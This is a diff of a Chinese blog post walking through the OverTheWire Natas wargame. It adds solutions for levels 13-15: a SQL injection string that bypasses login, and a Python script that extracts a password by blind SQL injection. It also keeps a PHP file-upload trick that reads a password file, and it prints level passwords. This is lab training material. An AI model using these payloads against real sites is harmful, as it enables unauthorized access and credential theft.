@@ -93,7 +93,7 @@
 <meta property="og:description" content="level 0直接鼠标右键查看源代码即可。flag：gtVrDuiDfck831PqWsLEZy5gyDz1clto   level 0 -&amp;gt; level 1由于鼠标右键被禁止，用CTRL + U(或者F12在控制台查看源代码)即可。flag：ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi   level 1 -&amp;gt; level 2CTRL + U查看源代码发现文件 “">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://benjamin.place/images/natas12.png">
-<meta property="og:updated_time" content="2017-08-30T01:59:19.746Z">
+<meta property="og:updated_time" content="2017-09-03T15:03:29.053Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="overthewire natas 攻略">
 <meta name="twitter:description" content="level 0直接鼠标右键查看源代码即可。flag：gtVrDuiDfck831PqWsLEZy5gyDz1clto   level 0 -&amp;gt; level 1由于鼠标右键被禁止，用CTRL + U(或者F12在控制台查看源代码)即可。flag：ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi   level 1 -&amp;gt; level 2CTRL + U查看源代码发现文件 “">
@@ -354,8 +354,42 @@
 <h3 id="level_11_-_26gt_3B_level_12"><a href="#level_11_-_26gt_3B_level_12" class="headerlink" title="level 11 -&gt; level 12"></a>level 11 -&gt; level 12</h3><p>由于本题中对所上传的文件没有进行任何的安全检查，于是我们编写一下脚本并上传：  </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">readfile(<span class="string">'/etc/natas_webpass/natas13'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>不妨将脚本保存为’test.php’，但是上传后发现文件后缀会被默认修改为<code>.jpg</code>，于是用BP抓包分析，内容如下<br><img src="/images/natas12.png" width="50%" height="50%" align="center/"><br>本想着用<code>%00</code>截断，但是这里只需直接将<code>.jpg</code>改为<code>.php</code>提交即可。<br><strong>flag：jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</strong>  </p>
-<h3 id="level_12_-_26gt_3B_level_13"><a href="#level_12_-_26gt_3B_level_13" class="headerlink" title="level 12 -&gt; level 13"></a>level 12 -&gt; level 13</h3><p>这一关较上一关就只增加了一个 <code>exif_imagetype</code>函数来检查上传文件的类型， 而<a href="http://php.net/manual/zh/function.exif-imagetype.php" target="_blank" rel="external">exif_imagetype</a>函数的检查机制为”读取文件的第一个字节并检查其签名”，于是为了达到欺骗目的，我们只需在上一关脚本的基础上用二进制文本编辑器在脚本头部加上JPG文件的<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E5%A4%B4" target="_blank" rel="external">文件头</a>，即<code>FF D8 FF</code>，之后上传并抓包修改即可。<br><strong>flag：jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</strong>  </p>
-<h3 id="level_13_-_26gt_3B_level_14"><a href="#level_13_-_26gt_3B_level_14" class="headerlink" title="level 13 -&gt; level 14"></a>level 13 -&gt; level 14</h3>
+<h3 id="level_12_-_26gt_3B_level_13"><a href="#level_12_-_26gt_3B_level_13" class="headerlink" title="level 12 -&gt; level 13"></a>level 12 -&gt; level 13</h3><p>这一关较上一关就只增加了一个 <code>exif_imagetype</code>函数来检查上传文件的类型， 而<a href="http://php.net/manual/zh/function.exif-imagetype.php" target="_blank" rel="external">exif_imagetype</a>函数的检查机制为”读取文件的第一个字节并检查其签名”，于是为了达到欺骗目的，我们只需在上一关脚本的基础上用二进制文本编辑器在脚本头部加上JPG文件的<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E5%A4%B4" target="_blank" rel="external">文件头</a>，即<code>FF D8 FF</code>，之后上传并抓包修改即可。<br><strong>flag：Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</strong>  </p>
+<h3 id="level_13_-_26gt_3B_level_14"><a href="#level_13_-_26gt_3B_level_14" class="headerlink" title="level 13 -&gt; level 14"></a>level 13 -&gt; level 14</h3><p>就是一个简单的sql注入，由于查询语句已经给出，因此直接用 <code>&quot;</code> 闭合username即可。<br>用户名和密码都输入 <code>&quot; or &quot;1&quot;=&quot;1</code> ，则此时查询语句变为<code>select * from users where username =&quot;&quot; or &quot;1&quot;=&quot;1&quot; and password=&quot;&quot; or &quot;1&quot;=&quot;1&quot;</code> ， 又由于 <code>&quot;1&quot;=&quot;1&quot;</code> 恒成立，因而绕过了登录。<br><strong>flag：    AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</strong>  </p>
+<h3 id="level_14_-_26gt_3B_level_15"><a href="#level_14_-_26gt_3B_level_15" class="headerlink" title="level 14 -&gt; level 15"></a>level 14 -&gt; level 15</h3><p>首先查看源代码发现其中有提示说数据库中创建了username和password两个字段,然后再结合给出的是一个查询框且查询语句已经给出，即   <code>$query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</code>， 于是先随便输入几个试试，发现都是返回“This user doesn’t exist”，再想到我们要获取的是natas16的密码，输入’natas16’试试，发现返回“This user exists.”，此时语句为‘SELECT * from users where username=”natas16”’，但是由于此处没有进行严格的输入检查，所以我们可以试试查询<code>natas16&quot;</code>，即加一个<code>&quot;</code>，发现报错，于是尝试用MYSQL中通配符<code>%</code>来爆破出password的值，在这里我们可以选用<a href="http://www.5idev.com/p-php_mysql_like.shtml" target="_blank" rel="external">LIKE BINARY语句</a>，再结合之前所有关卡的密码长度都是32个字符且包含大小写字母和数字，于是我们可以编写脚本来实施爆破，此处选用python。为了提高效率，脚本的大体思路是先筛选出密码中所包含的字符，再用这些字符来在每一个密码位挨个尝试，脚本如下(为了代码简洁这里就选用<a href="http://docs.python-requests.org/en/latest/user/quickstart/#make-a-request" target="_blank" rel="external">requests模块</a>)：  </p>
+<pre><code class="python"><span class="keyword">import</span> string
+<span class="keyword">import</span> requests
+
+char = string.letters + string.digits
+url = <span class="string">"http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/"</span>
+exits_str = <span class="string">"This user exists."</span>
+lettersin = <span class="string">''</span>
+passwd = <span class="string">''</span>
+r = requests.get(url)
+
+<span class="keyword">if</span> r.status_code != requests.codes.ok:
+    <span class="keyword">raise</span> ValueError(<span class="string">"Fail to connect."</span>)
+
+<span class="keyword">for</span> c <span class="keyword">in</span> char:
+    target = url + <span class="string">'?username=natas16" AND password LIKE BINARY "%'</span> + c + <span class="string">'%" "'</span>
+    response = requests.get(target)
+    <span class="keyword">if</span> response.content.find(exits_str) != <span class="number">-1</span>:
+        lettersin += c
+        <span class="keyword">print</span> <span class="string">"Used chars: "</span> + lettersin
+
+<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):
+    <span class="keyword">for</span> c <span class="keyword">in</span> lettersin:
+        target = url + <span class="string">'?username=natas16" AND password LIKE BINARY "'</span> + passwd + c + <span class="string">'%" "'</span>
+        response = requests.get(target)
+        <span class="keyword">if</span> response.content.find(exits_str) != <span class="number">-1</span>:
+            passwd += c
+            <span class="keyword">print</span> <span class="string">"Password: "</span> + passwd + <span class="string">'*'</span> * int(<span class="number">32</span> - len(passwd))
+            <span class="keyword">break</span>
+
+<span class="keyword">print</span> <span class="string">"Done!"</span>
+</code></pre>
+<p><strong>flag:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</strong>  </p>
+<h3 id="level_15_-_26gt_3B_level_16"><a href="#level_15_-_26gt_3B_level_16" class="headerlink" title="level 15 -&gt; level 16"></a>level 15 -&gt; level 16</h3>
       
     </div>
 
@@ -373,7 +407,7 @@
   <p><span>本文标题:</span><a href="/2017/08/21/overthewire-natas-攻略/">overthewire natas 攻略</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Benjamin 的个人博客">Benjamin</a></p>
   <p><span>发布时间:</span>2017年08月21日 - 21:08</p>
-  <p><span>最后更新:</span>2017年08月30日 - 09:08</p>
+  <p><span>最后更新:</span>2017年09月03日 - 23:09</p>
   <p><span>原始链接:</span><a href="/2017/08/21/overthewire-natas-攻略/" title="overthewire natas 攻略">http://benjamin.place/2017/08/21/overthewire-natas-攻略/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://benjamin.place/2017/08/21/overthewire-natas-攻略/"  aria-label="复制成功！"></i></span>
   </p>
@@ -572,7 +606,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#level_0"><span class="nav-number">1.</span> <span class="nav-text">level 0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_0_-_26gt_3B_level_1"><span class="nav-number">2.</span> <span class="nav-text">level 0 -> level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_1_-_26gt_3B_level_2"><span class="nav-number">3.</span> <span class="nav-text">level 1 -> level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_2_-_26gt_3B_level_3"><span class="nav-number">4.</span> <span class="nav-text">level 2 -> level 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_3_-_26gt_3B_level_4"><span class="nav-number">5.</span> <span class="nav-text">level 3 -> level 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_4_-_26gt_3B_level_5"><span class="nav-number">6.</span> <span class="nav-text">level 4 -> level 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_5_-_26gt_3B_level_6"><span class="nav-number">7.</span> <span class="nav-text">level 5 -> level 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_6_-_26gt_3B_level_7"><span class="nav-number">8.</span> <span class="nav-text">level 6 -> level 7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_7_-_26gt_3B_level_8"><span class="nav-number">9.</span> <span class="nav-text">level 7 -> level 8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_8_-_26gt_3B_level_9"><span class="nav-number">10.</span> <span class="nav-text">level 8 -> level 9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_9_-_26gt_3B_level_10"><span class="nav-number">11.</span> <span class="nav-text">level 9 -> level 10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_10_-_26gt_3B_level_11"><span class="nav-number">12.</span> <span class="nav-text">level 10 -> level 11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_11_-_26gt_3B_level_12"><span class="nav-number">13.</span> <span class="nav-text">level 11 -> level 12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_12_-_26gt_3B_level_13"><span class="nav-number">14.</span> <span class="nav-text">level 12 -> level 13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_13_-_26gt_3B_level_14"><span class="nav-number">15.</span> <span class="nav-text">level 13 -> level 14</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#level_0"><span class="nav-number">1.</span> <span class="nav-text">level 0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_0_-_26gt_3B_level_1"><span class="nav-number">2.</span> <span class="nav-text">level 0 -> level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_1_-_26gt_3B_level_2"><span class="nav-number">3.</span> <span class="nav-text">level 1 -> level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_2_-_26gt_3B_level_3"><span class="nav-number">4.</span> <span class="nav-text">level 2 -> level 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_3_-_26gt_3B_level_4"><span class="nav-number">5.</span> <span class="nav-text">level 3 -> level 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_4_-_26gt_3B_level_5"><span class="nav-number">6.</span> <span class="nav-text">level 4 -> level 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_5_-_26gt_3B_level_6"><span class="nav-number">7.</span> <span class="nav-text">level 5 -> level 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_6_-_26gt_3B_level_7"><span class="nav-number">8.</span> <span class="nav-text">level 6 -> level 7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_7_-_26gt_3B_level_8"><span class="nav-number">9.</span> <span class="nav-text">level 7 -> level 8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_8_-_26gt_3B_level_9"><span class="nav-number">10.</span> <span class="nav-text">level 8 -> level 9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_9_-_26gt_3B_level_10"><span class="nav-number">11.</span> <span class="nav-text">level 9 -> level 10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_10_-_26gt_3B_level_11"><span class="nav-number">12.</span> <span class="nav-text">level 10 -> level 11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_11_-_26gt_3B_level_12"><span class="nav-number">13.</span> <span class="nav-text">level 11 -> level 12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_12_-_26gt_3B_level_13"><span class="nav-number">14.</span> <span class="nav-text">level 12 -> level 13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_13_-_26gt_3B_level_14"><span class="nav-number">15.</span> <span class="nav-text">level 13 -> level 14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_14_-_26gt_3B_level_15"><span class="nav-number">16.</span> <span class="nav-text">level 14 -> level 15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level_15_-_26gt_3B_level_16"><span class="nav-number">17.</span> <span class="nav-text">level 15 -> level 16</span></a></li></ol></div>
             
           </div>
         </section>
